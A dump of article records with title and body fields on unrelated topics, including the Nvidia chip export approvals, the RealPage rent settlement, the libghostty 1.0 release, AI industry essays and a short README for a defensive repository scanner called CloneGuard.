articles.title: The Military Triumphal Arch
articles.body:
An American Vision
Finally Realized
A Monument To The American Spirit
For 250 years, Americans have triumphed over war, division, and hardship. Against impossible odds, our people have built a land of liberty where the individual citizen can thrive, prosper, and pursue happiness greater than any other place in the world.
The United States Military Triumphal Arch celebrates America's first 250 years and stands as a symbol of its next 250. It serves as a solemn entrance to Arlington National Cemetery, honoring the heroes who gave their lives for our freedom, and as a grand gateway to the capital of the nation that has been, and will forever be, the greatest force for freedom and goodness in the history of the world.
An American Vision
Finally Realized
A century ago, America envisioned a monument to reconciliation and national unity following the Civil War.
In 1924, the Arlington Memorial Bridge Commission proposed two monumental columns in Memorial Circle, crowned by figures of Victory. One represented the North. The other represented the South. But the columns were never built.
Today, President Donald J. Trump fulfills and expands on this historic civic vision: what began as a celebration of the reconciliation between North and South finds new expression as a celebration of the triumph of the American spirit throughout the full sweep of American history.
The Military Triumphal Arch realizes a century-old ambition for beautiful monumental architecture in Memorial Circle. While such a grand monument was planned and dreamed of by all of America, it was a Dream that never got built because of the onset of the Great Depression of 1929 — But it will get built now.
The Military Triumphal Arch will be an enduring symbol of American Freedom, American Strength, and American Unity. We will fulfill the aspirations of the Great American Patriots who came before us, and whose plans and visions will finally be realized with the start of construction in our 250th year.
A Tribute To Our Heroes
From the Lincoln Memorial, across Arlington Memorial Bridge, to the hallowed grounds of Arlington National Cemetery, an extraordinary ceremonial axis connects the ideals of the American Republic engraved in stone —with the heroes who fought and died to defend them.
The Military Triumphal Arch honors all who have served our country. It will inspire future generations to build an America worthy of their sacrifice.
View on map
“This will be the greatest and most beautiful triumphal arch, anywhere in the world.”
Donald J. Trump
45th & 47th President of the United States
The Future Begins
With a Step
Great nations remember. Great nations also imagine the possibilities of the future.
The Military Triumphal Arch will honor those who founded, built, defended, and transformed this country, while inspiring new generations to carry forward the American promise.
For centuries to come, Americans will walk beneath this monument with our nation’s history behind them and its future before them, remembering the extraordinary nation they inherited and celebrating the freedom they will pass on.

articles.title: The US let Nvidia sell chips to an empty office in China
articles.body:
Concerns are being raised that neither the Commerce Department nor Nvidia are doing their due diligence when it comes to vetting Chinese firms cleared to handle the company’s H200 AI chips. According to The New York Times, New Matrix is on the list of approved firms, yet its offices are empty, “a hollow gray shell with wires dangling from the ceiling where lights should be.” In fact, the paper could find little evidence that the company exists in any meaningful way:
The US let Nvidia sell chips to an empty office in China
The government is approving sales of Nvidia’s AI chips to Chinese firms with ties to blacklisted companies.
Only scant information can be found online about New Matrix, which was created 17 months ago. At the building that New Matrix lists as its address, a company directory does not include the firm. At the nearby property management agency for the industrial park, a receptionist and a manager both said they had no record of the company.
What little information can be found about New Matrix is concerning. Its owners have ties to a Chinese private equity firm that has been blacklisted by the US government since 2024. And according to the Times, this is not a rare lapse in oversight, but a troubling pattern of companies connected to entities with national-security-related trade restrictions being approved to purchase Nvidia chips.
Nvidia had been restricted from selling chips to China during the Biden presidency. But the Trump administration relaxed those limits after Nvidia agreed to give the government a 15-percent cut of all sales. The company’s CEO, Jensen Huang, also launched an intense lobbying campaign and was apparently targeted by China’s Ministry of State Security in a spying plot.

articles.title: Next Time You Make Chicken Noodle Soup, Don’t Skip Emily Blunt’s Upgrade
articles.body:
Next Time You Make Chicken Noodle Soup, Don’t Skip Emily Blunt’s 1-Ingredient Upgrade
It is the beginning of sniffle season in my social circles. Whether you catch a cold or you’ve got the flu, you can never go wrong with making a big pot of healing soup. And in my opinion, the all-time best soup for comfort is chicken noodle.
I was recently flipping through one of Stanley Tucci’s old cookbooks, The Tucci Table: Cooking With Family and Friends from 2014, and saw a recipe from his famous sister-in-law, Emily Blunt. We are big fans of the actress here at The Kitchn, and I have actually personally written a story about her crispy potatoes that Jennifer Garner loves. Emily Blunt’s recipe for chicken noodle soup looked amazing, but what really made me want to try it was that she added barbecue sauce to the soup. Here’s what I thought after making it myself.
How to Make Emily Blunt’s Chicken Noodle Soup
- Cook the chicken. Slice a yellow onion into half-moons and spread out onto a lined baking sheet. Top with chicken legs and thighs, and season with olive oil, salt, black pepper, and fresh thyme. Bake for 40 minutes.
- Sauté the veggies. In a Dutch oven, sauté diced onion, carrot, and celery in olive oil until soft, and season with salt and pepper. Add garlic and ginger and cook until fragrant.
- Add the liquids and chicken. Pour in white wine and let it cook down for a few minutes. Then, add the chicken broth and bouillon cubes. Bring the pot to a boil and shred chicken while you wait.
- Simmer. Once the pot reaches a boil, turn it down to a simmer and add in shredded chicken and onions. Stir in barbecue sauce and throw in a bay leaf and a couple of chicken bones. Let the pot simmer on low for at least two hours.
- Cook the noodles. Before the soup is done simmering, bring a pot of salted water to a boil. Cook the egg noodles until al dente and drain.
- Remove bones and bay leaf and serve. After two hours, fish out the bay leaf and chicken bones. Add the noodles to your bowls and ladle the soup over them to serve.
My Honest Review of Emily Blunt’s Chicken Noodle Soup
If you read about Emily Blunt’s tip to add barbecue sauce to the soup and were a bit hesitant, you were not alone. The ingredient is actually listed as “optional” in the cookbook’s ingredients list, but I decided to trust Emily. And you absolutely should too because it makes the broth so delicious. In the book, Tucci writes that Emily says, “I don’t know why I started doing this — it sounds a bit random, but I tried it once, and I just think it adds a bit of a kick of flavor.” I have to agree with her. The broth is so flavorful (thanks to the barbecue sauce and chicken bouillon). The barbecue sauce in particular brings a slight sweetness and umami flavor. It’s similar to how a lot of people like to add soy sauce, in my eyes.
This cookbook’s recipe page does not have the total time for this recipe, but you should know that it is time-consuming. A lot of the cooking is hands-off, though. The pot spends two hours simmering on the stove, and the chicken also spends a good 40 minutes in the oven cooking (although you can make it ahead). It’s the perfect dish to put on the stove in the morning, and it’ll be ready for lunch. And all that time is so worth it. You can just tell from the broth’s color. It’s pure liquid gold.
I really liked how Emily recommends simmering the soup with some of the chicken bones so that it adds even more flavor, collagen, and protein to the broth. I actually used chicken bone broth instead of just broth for even more protein. Everyone has their preference on the best noodle to add to this soup, but I love egg noodles. They feel extra-comforting to me, even though my mom was a fan of angel hair broken into tiny bites. And then there’s this soup’s namesake ingredient: the chicken. It is just so tender and packed with flavor from baking and simmering. I have nothing bad to say. It almost makes me want to catch a cold.

articles.title: Vibrating Mattress Helps Clear Alzheimer's Protein From the Brain
articles.body:
Vibrating Mattress Helps Clear Alzheimer's Protein From the Brain 26
			
		 	
				A vibrating mattress combined with two pills that release nitric oxide enhanced the brain's ability to clear an Alzheimer's-related protein. According to New Scientist, the experiment "caused the brain's blood vessels to swell and constrict more strongly, which enhanced the glymphatic system's clearance of [the protein]." From the report:  [Kesa Kiviniemi at the University of Oulu in Finland] and his colleagues recruited 29 adults who hadn't been diagnosed with Alzheimer's disease or any other cognitive issues. The participants took a pill that dissolves when under the tongue, releasing nitric oxide. They then lay on a mattress that caused their bodies to gently vibrate for 40 minutes, taking another pill halfway through. Blood samples revealed that their levels of a type of protein called beta-amyloid 42 increased by 35 per cent, on average, after the intervention. This protein, which usually helps neurons signal and connect to each other, misfolds and form clumps in Alzheimer's disease.
"The treatment seemed to enhance the glymphatic system's ability to clear beta-amyloid from the brain to the blood," says Kiviniemi. "A 35 per cent increase in circulating beta-amyloid 42 is a substantial and very interesting acute effect," says Tuomas Lilius at the University of Helsinki, who wasn't involved in the work. "It is certainly possible it could become biologically, and eventually clinically, relevant." Side effects were mild and minimal, with six of the participants experiencing issues such as nausea and headache. However, this could partly be due to the expectation of an effect from the nitric oxide pills. The researchers hope to overcome this in future work by including placebo pills.
Brain scans suggest the treatment enhanced the flow of fluid along glymphatic channels, probably by widening the brain's blood vessels and making them pump more strongly, says Kiviniemi. But other mechanisms could also be at play, says Brown. For instance, this intervention may slow the breakdown of beta-amyloid 42 by the liver, leading to higher amounts in the bloodstream, he says. Future studies could get around this by injecting markers into cerebrospinal fluid, which moves through the glymphatic system, to more directly measure its flow, says Brown. Additional experiments by Kiviniemi and his colleagues tested either only the mattress vibrations or only the nitric oxide pills on the same participants, at least a week before or after they underwent the combined approach. Based on brain scans, these solo interventions seemed to have less than half the effect on the glymphatic system than when they were combined. The findings have been published in the journal Nature Communications.

articles.title: Developer Pulls Roku's Popular Fish Tank Screensaver Following Fox Sale
articles.body:
Developer Pulls Roku's Popular Fish Tank Screensaver Following Fox Sale (arstechnica.com) 47
			
		 	
				Roku is removing its popular Aquatic Life fish tank screensaver on December 1 and automatically switching affected users to Roku City. According to Cord Cutters News, the creator pulled the license after Roku's sale to FOX was announced. Ars Technica reports:  The screensaver has been an option for Roku OS users for 10 years. Roku has been licensing the animation, which is called the Marine Aquarium, from artist Jim Sachs through Prolific Publishing. Sachs is the creator and copyright holder of the Marine Aquarium. He developed the screensaver through his company SereneScreen. He tells Ars Technica that the licensing agreement with Roku is up for renewal every October and can be canceled by either party for any reason. A day after learning that Fox was planning to buy Roku, a deal that closed today, Sachs told Prolific that he wouldn't be renewing Roku's license. "I can't be part of the Fox world," he tells Ars, pointing to Fox News' controversial style of news and entertainment.
Roku will automatically switch the Aquatic Life screensaver on affected devices to the Roku City screensaver, another popular animation that includes subtle advertisements, according to the user notice. The Aquatic Life screensaver provided an ad-free, relaxing display for years for some Roku users. Numerous people online have lamented the impending loss of the screensaver for Roku OS. [...] The decision to not renew the licensing contract has "major financial consequences," Sachs said. "Our needs are very small, with a high property tax bill being the only significant expense," he said. "We'll be okay but can't start any of the projects I had planned."
According to Sachs, the licensing "agreement was $80,000 per year for exclusive rights to all set-top devices, or $60,000 per year for non-exclusive. They have always opted for exclusive." Ars asked Roku to confirm the details of the licensing agreement but didn't hear back ahead of publication. The licensing deal with Roku was Sachs' primary form of income, he told Ars, noting low sales of the version of the screensaver for computers. Marine Aquarium fans can still buy the screensaver for Windows, macOS, iOS, and Android, but it seems unlikely that it will return to the Roku platform.

articles.title: Every processor die anyone has photographed and given away
articles.body:
Inside every processor is a flat piece of silicon, usually smaller than a fingernail. To see it you have to sand or dissolve the package away and photograph what is left through a microscope. A handful of people do this and give the pictures away, most of all Pauli Rautakorpi, ZeptoBars in Moscow, John McMaster and a photographer who posts as Fritzchens Fritz. These are the 356 processors they have photographed, from 1972 to 2024.
Click a chip to see it large. True scale draws the 114 whose size we know at the same scale, so a 1970s chip is a speck next to a modern one.
If you like news with a puzzle in it, we make a daily word game called Long Story Short.
Pauli Rautakorpi (162), Fritzchens Fritz (68), John McMaster (36), Martijn Boer (20), Cole L (16), ZeptoBars (10), Sean Riddle (4), Antoine Bercovici (4), Ken Shirriff (3), Mister rf (3), Epop (3), InfoSecDJ (3), Nick V. Chernyy (3), and 21 from 18 other photographers. Every photo keeps its own licence, shown when you open a chip, and links back to where it was published: Wikimedia Commons, Flickr, ZeptoBars, Siliconpr0n and the CPU Graveyard wiki. Die sizes come from the photographers' own notes and Wikipedia's transistor count tables. If a chip is missing, nobody has released a free photo of it yet.

articles.title: RealPage rent-pricing case wraps with nearly $360M to renters
articles.body:
A major federal antitrust lawsuit over algorithmic rent-setting via Realpage’s software has been settled, per filings in RealPage Inc. Rental Software Antitrust Litigation in the U.S. District Court for the Middle District of Tennessee, Nashville Division.
The court approved the settlements, “including the Settlement Amounts, the releases, and the dismissal with prejudice of the Action as to the Settling Defendants,” and found that the settlements are fair and adequate to the settling class, according to the Oct. 15 filing.
In late 2022 and early 2023, a slew of class-action lawsuits were filed against Realpage and about 50 of the largest apartment owners and operators, alleging that the Richardson, Texas-based software provider enabled landlords to collude to raise rent prices beyond free-market levels in violation of antitrust law. Those cases were centralized into one in April 2023.
Settlement agreements came in waves, with 11 defendant landlords reaching 14 class settlements in May for $218 million and 27 landlords with 26 settlements worth more than $141.8 million in October 2025. The plaintiffs asked for class certification on Oct. 2.
The settlement class includes U.S. multifamily renters who paid any owner or operator on a property that used Realpage’s Revenue Management Solutions, Lease Rent Options, YieldStar and/or AI Revenue Management at any time between Oct. 18, 2018 through Nov. 21, 2025, per the filing.
None of the companies admitted fault or liability. They did, however, agree to stop providing Realpage with their nonpublic data for use as an input in Realpage’s revenue management system’s price recommendations, and to stop using Realpage’s RMS in ways that use competitors’ non-public data to inform pricing recommendations.
Whether the settlement agreements “really will work to limit the ability of these firms to coordinate with each other, to communicate with each other, that's the thing that I can't tell reading the decree,” Peter Carstensen, antitrust expert and professor of law emeritus at the University of Wisconsin-Madison, told Multifamily Dive.
The settlements offer guidance to the companies providing rent-pricing models, according to Carstensen.
Looking ahead, “the question for any particular industry is: How much are they giving up by restricting what they do? Are there moves they can make consistent with the decree that would allow them to establish a little more coordination in pricing?” Carstensen said.
States tried to stop settlements
Not everyone is happy with the settlements.
After the defendant landlords asked for final approval of their settlements on Sept. 25, attorneys general from the District of Columbia, Kentucky, Maryland, New Jersey and Washington fought the agreements, saying that they could “unlawfully restrict” their own separate lawsuits. The AGs had raised such concerns after the first group of settlement agreements last November.
However, Judge Waverly Crenshaw again denied their request to reject the settlements, saying in an Oct. 9 filing that “the proposed releases do not injure the State AGs’ independent sovereign or quasi-sovereign interests,” but added that he would take their concerns into consideration.
Although the DOJ and state AGs with antitrust concerns typically work together, there are a growing number of fights between states and the federal government over settlements right now, according to Carstensen.
“What is different here in the second Trump administration is that the Justice Department and Trade Commission are bringing cases and settling them, and the states have brought the same case but are not settling on the same terms,” Carstensen said. “You're looking at the states not having confidence in the Justice Department or the Trade Commission to do the right thing.”
Per the final settlement, all claims against the defendants are permanently closed, except where expressly outlined in the agreement, according to the Oct. 15 filing.
“This dismissal does not affect, release, or impair any claim against any Defendant or alleged co-conspirator that is not a Settling Defendant,” Waverly said in the filing. Furthermore, the court’s certification of the settlement class “is for settlement purposes only and is without prejudice to, or waiver of, any defense, argument, or position of any Party with respect to any other class in the Action or any other action.”
In November 2025, the U.S. Justice Department settled with Realpage in a related 2024 lawsuit that claimed the software provider enabled landlords to collude to raise rent prices. Several similar state and local lawsuits are ongoing.
“The federal settlement is what it is, but it's not the final word necessarily,” Carstensen said.

articles.title: Libghostty 1.0
articles.body:
Mitchell Hashimoto
Libghostty 1.0
libghostty-vt 1.0 is here. libghostty is a
portable, high-performance C library for terminal emulation, extracted
directly from the core of Ghostty. The 1.0 release means both the library
itself and the C ABI are now stable.
A little over a year ago, I wrote that libghostty is coming. At the time, the Zig module had just been merged, the C API didn't exist, and nobody but Ghostty was a consumer. Today, the C API is a complete terminal emulator, it runs in production for millions of people across hundreds of products, both free and commercial, and it has a real, enforced ABI stability policy.
This post is about how we got here and what 1.0 actually means.1
Who Is Already Using It
Since starting the Ghostty project in 2022, the most common question I've been asked is "why?". I already answered this in the libghostty is coming post, so feel free to read that if you wish. Today, I'd rather answer this by showing the broad industry impact libghostty has already had. I believe this strongly validates its existence.
A year ago, I used a bug in JediTerm, the terminal emulator in JetBrains IDEs, as an example of why terminal emulation is hard to get right. A year later, the terminal in JetBrains IDEs now runs on libghostty. Every IntelliJ, PyCharm, GoLand, etc. user now has a libghostty-powered terminal. Based on a report by JetBrains, that's over 12.5 million active users.
Neovim has an approved pull request
replacing libvterm with libghostty-vt. Among other things, it closes a
10-year-old issue
about reflowing scrollback on resize. The maintainers are waiting on a
tagged release before merging so that distributions can package the
dependency separately, and the release today should enable that.
KDE developers are experimenting with a Konsole replacement built on it. Vercel's Turborepo uses it to render task output in its TUI. devenv uses it to drive shells. Antithesis used it to fuzz TUI programs and found real bugs in btop and others. Ghostel brings it to Emacs. ghostty-web is the WASM build with an Xterm.js-compatible API. Commercial products like OrbStack embed it. And a whole wave of new terminals and "agentic" coding tools, such as herdr and cmux, have been built on it rather than writing yet another emulator.
There are community bindings for Rust, Go, JavaScript, Swift, Python, .NET, Elixir, Dart, Java, and more, and the awesome-libghostty list tracks well over a hundred projects.
More people today use a terminal powered by libghostty than use Ghostty the application, by a very large multiple. And libghostty is having a much larger impact than being "just" a terminal emulator.2
ABI Stability
1.0 means libghostty-vt follows semantic versioning and has strict
ABI compatibility
promises so that packagers across distributions and operating systems
can be confident packaging libghostty-vt and program developers can be
confident dynamically linking against it.
Beyond providing useful features, I believe the hallmark of a high-quality and enduring C library is ABI stability. So from the start, I took inspiration from C libraries I enjoyed working with and designed the API to have a strong, stable ABI that allows for future additions.
Every object is an opaque handle. The hundreds of values you might read or
write go through a small set of enum-keyed getters and setters, so we
can add new values easily without introducing a new symbol. Programs with
newer headers linked against an older libghostty get GHOSTTY_UNSUPPORTED
results instead of crashes or undefined behavior. The few non-opaque structs
we have carry their size so that fields can be appended later, or contain
reserved padding. Enums are pinned to int on every compiler, as much as
the C standard allows.
Our CI enforces our ABI policy. Every change is checked with libabigail against a committed baseline on Linux, and against golden type manifests on macOS and WebAssembly.
On ELF platforms, every exported symbol is also versioned, so the dynamic loader refuses to load a mismatched library by name rather than failing in some mysterious way later.
Packaging
In addition to ABI stability, the 1.0 release brings along the proper
build tooling, tarballs, dependency licensing manifests, documentation,
and more to enable every major operating system and distribution to
package libghostty-vt through standard official tooling.
Libghostty has its own release cycle, separate from Ghostty the application. And it has its own tarballs with only the files and dependencies libghostty needs, resulting in smaller sizes and simpler licensing verification and compatibility.
Each release publishes a signed source tarball along with a companion
dependencies tarball containing every Zig package in Zig's own cache
layout, so a distribution can build the library completely offline. The
build installs the shared and static libraries with a proper SONAME,
headers, pkg-config files, and a CMake package config, and it honors
--prefix, DESTDIR, and lib64. Debug info is kept by default so
distros can split it out. All of this is documented in
PACKAGING-LIBGHOSTTY.md,
which ships with the tarball.
Dependencies and Licensing
libghostty-vt is MIT licensed. At runtime it needs nothing beyond
libc, and it can be built fully freestanding if you don't want that
either.3
The library compiles in a small number of permissively licensed dependencies: simdutf and Google Highway for SIMD, a compact Unicode table for grapheme data, and Wuffs for image decoding in the Kitty graphics protocol. Both simdutf and Highway are built without libc++, so there is no C++ standard library dependency.
There is no copyleft code anywhere in the dependency tree. Every dependency is listed in a machine-readable manifest with its version, SPDX license, and hash, specifically so distros can fill in their bundled-library metadata more easily.
If a distro would rather dynamically link the system simdutf or Highway, there's a build flag for that.
Portability
libghostty-vt is highly portable. The table below lists all the platforms
and architectures that we build and test (full unit tests plus running all
examples) in CI:
There is a second set of platforms we build in CI but do not run tests for. These systems all have known users; we just haven't set up the machinery for automated testing:
Each of the tested platforms gets the artifacts it expects:
- Linux and FreeBSD get a shared library with a proper SONAME and versioned symbols, a static library, headers, pkg-config files, and a CMake package config.
- macOS and iOS get a dylib with an @rpath install name and
compatibility version, plus an XCFramework covering macOS, iOS, and
the iOS simulator that drops straight into Xcode or Swift Package
Manager.
- Windows gets a DLL with a .pdb, an import library, and a static
library. The library is built with the GNU ABI, but MSVC programs
link against it through the import library and CI verifies this.
- Android gets a shared library built against the NDK with 16 KB page size support, as required by Android 15+.
- WebAssembly ships in two flavors, one optimized for speed and one
for size, and the small one is under a megabyte with every feature
enabled. If you only need a read-only viewer, subsystems like input
encoding, search, selection, and Kitty graphics can be compiled out
with a build flag, which roughly halves the module. Every function
stays exported and simply returns GHOSTTY_UNSUPPORTED so your code
doesn't have to change.4
Portability isn't just about the ability to build and run. It's also about resource usage and being able to work in a wide variety of resource environments.
For resource usage, the library creates no threads, allocates only through
an allocator you can customize, and uses minimal compute and memory.
I've run 10,000 active terminals, each with a live shell producing output,
on a Linux server with 4 cores and 8 GB of RAM. In this test, I had to use
dash because bash used far more RAM than libghostty-vt and wouldn't fit
into the 8 GB budget.
What's Next
Libghostty 1.0 is a major milestone.
You can now create a terminal in ~1,500 lines of C that has more features and better performance than just about any terminal that existed in 2025, and most today in 2026.5 And thanks to the rich ecosystem of language bindings, you can do this in every major programming language. You get this for free. For almost no effort. You can just do it.
libghostty-vt is a generalized library, so we will focus on stability
while implementing as many terminal protocols as exist
(giving options to enable/disable them, of course) so that embedders
have the luxury of choice.
Every bug any libghostty-vt embedder reports makes everyone else in
the ecosystem better. Every feature we ship in libghostty-vt becomes
available to everyone quickly and safely. Terminals can move faster with
less fragmentation.
Thank you to everyone who contributed to the library, wrote bindings, filed bugs, and shipped something on top of it while the API was still experimental. As with all open source, this was the work of a large community.
Docs, examples, and downloads are at lib.ghostty.org.
Boo. 👻
Footnotes
- As usual, I hate that I have to do this for every post, but I want to note this post was completely hand-written with no AI assistance. ↩
- The numbers are rough because most consumers don't report usage, but JetBrains alone reports 12.5 million recurring active users, and that's before counting everything else on the list. ↩
- In the original post I wrote "not even libc!" The default build does
link libc, because the SIMD paths use it and the default allocator is
malloc. Turn off SIMD and the library is freestanding, which is
how it runs on bare-metal RISC-V and ARM targets. ↩
- The feature flags aren't WASM-specific; they work on every target. They're likely useful for things like embedded devices too. ↩
- "Features" here means the set of terminal protocols and sequences
understood, and "performance" means parsing throughput and memory
usage, since those are the parts libghostty-vt provides. ↩

articles.title: The Valley Bubble Breaks
articles.body:
This blog uses a new RSS feed. Please update the old QuirksBlog feed you used to follow.
November 2026 1 October 2026 3 September 2026 3 August 2026 2 May 2026 6 April 2026 9 2004-2021 blog
I expected something to happen around the AI hype after the US elections. I didn’t expect it to happen so soon. Too early to tell yaddah yaddah, and the hype could very well continue for another few months, but did any AI-related stock ever tumble before now?
Silicon Valley exists in its own reality bubble. Hell, the entire US tech scene inhabits in a bubble whose main feature is relentless self-flagellation. Apparently they’re all Guilty and will all be Punished. (Then again, the US is fundamentally a Calvinist country.) Sanity prevails outside the US. Sometimes.
For now I’ll stick to my idea: the Valley is creating something with the appeal of a 19th-century factory, complete with oppressed and estranged workers, without delivering the sole benefit of such factories: cheaper IT and other services. They want to get rid of the middle classes whose salaries they have to pay so badly that they forgot to create an appealing product.
The Valley doesn’t understand how fed up normal people are with AI. This is the first time ever a technological advance is so cordially disliked, and the Valley is not equipped to detect that. It has no experience with being disliked by normal people.
Also, so far many of the Valley’s consumer tech innovations were free. AI isn’t free, or even cheap, as we’ll see in the coming months, once credit dries up.
The Valley’s position will be damaged permanently, and tech will lose its centre of gravity, its global Schwerpunkt. I don’t think there will be a replacement. I think we’re moving to a multi-hub world, and I think that’s a good development. Sure, inertia will keep the Valley important for decades to come, but it’s lost its natural dominance of the hearts and minds of the world. Permanently.
None of this is a judgement on AI itself. I refuse to do anything about it until its true costs are known, after the hundreds of billions per year (month?) of free money from clueless investors dry up. All the while I acknowledge that there is something there that will change programming — just not as radically as the US-based doomsayers think. AI can copy, it cannot innovate.

articles.title: Partnering with Hacktron to find vulnerabilities in OpenAI's systems – OpenAI
articles.body:
Partnering with Hacktron to find vulnerabilities in OpenAI’s systems
Today we’re announcing a partnership with Hacktron to find vulnerabilities in OpenAI’s systems. Our engineers and Hacktron’s security researchers will choose high-priority areas to test together, with a focus on how our systems interact with third-party services. As part of the partnership, we’re expanding Hacktron’s access to our frontier models through Daybreak Red.
As we work to accelerate cyber defense with frontier AI, we’re applying the same urgency to finding and fixing vulnerabilities in our own systems. Earlier this week, we announced that Cathedral’s researchers will work alongside our teams in our next security sprint. We also raised our bug bounty rewards to give independent researchers more reason to pursue vulnerabilities our own testing may have missed.
We became familiar with Hacktron through our Security Bug Bounty program and were impressed by the impact of the vulnerabilities its researchers have discovered and disclosed to us. The team builds AI agents for code review, penetration testing, and red teaming. Their research(opens in a new window) has uncovered vulnerabilities in how applications, cloud infrastructure, and identity systems interact. Their work shows what’s possible when security engineers build around AI to move faster and take on more ambitious research.
As AI agents connect services in new ways, that combination of skills becomes even more valuable. Working alongside Hacktron will help us test those connections more deeply and use what we learn to strengthen our defenses.
We’re grateful to Hacktron and other independent researchers who put time into finding and reporting weaknesses to help strengthen the security that protects all our users. To see which systems are in scope or submit a finding, visit our Security Bug Bounty program(opens in a new window).

articles.title: OpenAI valued at $1.25 trillion, as rival Anthropic nears its IPO
articles.body:
OpenAI is now valued at $1.25 trillion in a new round of funding that has raised another $11 billion, according to Bloomberg. That would make it one of the world’s most valuable companies, not long after raising $122 billion from investors in March at a valuation of $852 billion.
OpenAI valued at $1.25 trillion, as rival Anthropic nears its IPO
CEO Sam Altman said recently that OpenAI is prioritizing safety instead of going ‘guns blazing’ toward an IPO.
Echoing FT and Wall Street Journal reports from last week, Bloomberg says OpenAI is still pursuing additional investments that could increase the amount to $20 billion, and that it had initially hoped to raise as much as $30 billion at a higher valuation of $1.4 trillion. That was before tech stocks dropped, and the results of the midterms showed how much public opinion has turned against AI companies and data center projects.
OpenAI’s rival Anthropic filed its S-1 to go public last week. Earlier this year, OpenAI CEO Sam Altman said it’s holding off on its own IPO until it can make more confident claims about its models’ safety. He didn’t give a specific timeline for the IPO, but said at the time, “I think it’s also kind of bad for the world if OpenAI waits too long to go public.”

articles.title: The End of AI Frontiers
articles.body:
In 2023 after the ChatGPT release, it was clear to me that research needed to be more organized to succeed than was typical within Microsoft Research. The amount of support and focus which other research groups were applying was great enough that even with a clever idea pursued by one person it was likely to arrive late and unconvincing because one person could not move fast enough and the baselines which one person could assemble just were not strong enough to really show that an idea was worth taking flight. Several other folks thought similarly and we organized to create the AI Frontiers sub-organization within MSR.
In AI Frontiers, we actively tried to organize coherent research efforts. This was not precisely “top down” or “bottom up”, but rather mostly somewhere in the messy middle. There were disagreements of course, and resolving them was sometimes quite challenging. Compute availability was also an often-severe bottleneck. But at a high level I was under the general impression that the organization was succeeding in doing pioneering things, particularly given the small size of AIF (~50 people) and relative to what we could do previously. Much of the work of AIF was figuring out how to make agents work, for example the Autogen orchestration framework and the Fara computer use agent. In NYC however, several of us were interested in developing new fundamental capabilities such as the Next Latent objective which enables extrapolation, Dion3 which creates an optimized/improved Muon, or the Full Bandwidth Transformer which efficiently makes models function substantially more powerfully via recursion.
We also actively tried to share with the rest of MSR. For example, AIF decided to develop a monorepo that was shared by default with all of Microsoft Research. In this monorepo for example was the proven-capable edge scale pretraining codebase I talked about in the COLM keynote last month. This might seem like a minor detail, but the amount effort required to create a well-formed model creation pipeline is substantial and I’m aware of at least 4 efforts (the other 3 not in public-within-MSR repos) trying to develop model building pipelines.
In early September we were reorged into Microsoft AI. On the surface this could make sense, because putting two different AI organizations together creates opportunities for better concentration of effort, and there were places where AIF was ahead of MAI and of course vice-versa (MAI is much larger). In practice, there are substantial issues because the philosophy of the ex-Inflection leadership of MAI is incompatible. The core philosophy there is scaling, and aggressively not research. This might shock some folks who naturally think that the way you make better models is via research but there is plenty of evidence that bigger models are better models as far as the quality of the predictions they make and from a business perspective returns to scale are far more predictable than returns to research. In a scaling-only environment of course the primary effort is on getting/making/refining data, which is quite a step away from what we were working on. Aside from the incompatible focus, there was plenty of evidence that they just did not really want us.
It’s a tough situation to find yourself in. I consider the scaling-only focus to be both misdirected and not fun. It is an understandable failure mode—scaling is straightforward and it’s common for people to give up on a tradeoff between multiple competing ideals (like innovation and size) by short-sightedly adopting one in totality and dropping the other. But returns to research are real and significant. For example, the Bytedance experiments suggest a variant of the Full Bandwidth Transformer might be comparable to a model of twice the size, implying significant savings in training and inference for the same capability. Do the math—how much is it worth to halve training and inference cost given that the industry has investments approaching a trillion dollars?
So I situated my folks as best I could and left. I am quite fortunate in that there are many other people in the world who are capable of seeing the value of research and innovation which is my intrinsic center of interest. Every other founding AIF leadership team member seems to have come to a similar conclusion.
This does leave a question: Why not go back to MSR? I chatted with folks a bit but could not get away from two serious obstacles. The first is that I am just not comfortable being at a company where the research I do has no path to real use. I could not get innovation into use (or even seriously considered) when I was in MAI, so the prospects for success from MSR seem quite small. The second is that I’m afraid there’s a breakdown of the basic deal in MSR: do good work and good things happen. As far as I can tell we did good work and were non-consensually reorged away. Unfortunately, I would not be surprised to see that kind of thing continue to happen until MSR leadership develops a will to effectively organize to meet the moment.
So AI Frontiers is over. I’m sorry to say that there will not be internships with the folks there in the coming year—I enjoyed working with interns on many occasions. And my best wishes for the folks I leave behind. It is not hard to imagine a Microsoft of the future which becomes attractive for research again if the people in control can develop a little bit more wisdom.

articles.title: Abstract Wool Compositions Cascade from Weathered Metal in Amine El Gotaibi’s Sculptures
articles.body:
Abstract Wool Compositions Cascade from Weathered Metal in Amine El Gotaibi’s Sculptures
“Wind knows neither North nor South. Neither East nor West. It moves freely across territories, indifferent to the categories that divide them,” Amine El Gotaibi says. The Moroccan artist positions nature’s apathy toward national boundaries as an entry point for unraveling the forces that shape our perceptions and memories of a place.
El Gotaibi’s most recent body of work is on view this month at Southern Guild. Presented in an exhibition titled Wind From the North, a suite of sculptures made of metal and wool speak to the tensions between the land and the state and the ways we mark change. Many of the works emerge from panels of copper or steel weathered to reveal the oxidized patinas only possible with time. Affixed to these aged backdrops are tufts of beige and rust-colored fibers, which are either wound into tightly knotted tufts or left free-flowing.
Echoing the undulating terrain of mountains and the countryside, the cascading fibers tether to the artist’s interest in examining the landscapes of his home country and Northern Africa, more broadly. Wool is significant in the highlands, as textile production is one of the oldest craft traditions in this part of the continent. For El Gotaibi, this material significance directly links to his desire to challenge the idea that Africa’s cultural contributions are most likely to emerge from the central and south.
Instead, Wind from the North, an exhibition statement says, “extends this proposition beyond fixed coordinates, imagining geography as porous and interconnected, shaped as much by what passes through it as by the lines drawn around it.”
Wind From the North is on view through January 9 in New York. Find more from El Gotaibi on Instagram.

articles.title: HN: CloneGuard – scan a repo for credential-stealing tricks before you run it
articles.body:
Scan a project for malware tricks before you run it. Built after a fake-recruiter "demo app" tried to steal SSH and AWS keys.
cloneguard is a small, dependency-free Go command-line tool. It only reads files. It never runs, installs, or imports anything from the project it scans.
A common attack goes like this: someone posing as a recruiter sends you a "take-home
assignment" or "demo app". You clone it, run npm install or open it in your editor,
and it quietly uploads your SSH keys, cloud credentials, browser passwords or crypto
wallets. Often the trigger isn't the app itself but an install hook or an editor task
that runs the moment you open the folder.
cloneguard is a quick first look that catches the usual tricks, so you can decide whether the project is safe to touch.
Requires Go 1.24+. There are no third-party dependencies.
go build -o cloneguard ./cmd/cloneguard
Optionally put the binary on your PATH, for example mv cloneguard /usr/local/bin/.
cloneguard clone https://github.com/someone/demo-app   # clone, then scan right away
cloneguard scan ./some-folder                          # scan an existing folder
cloneguard scan                                        # scan the current folder
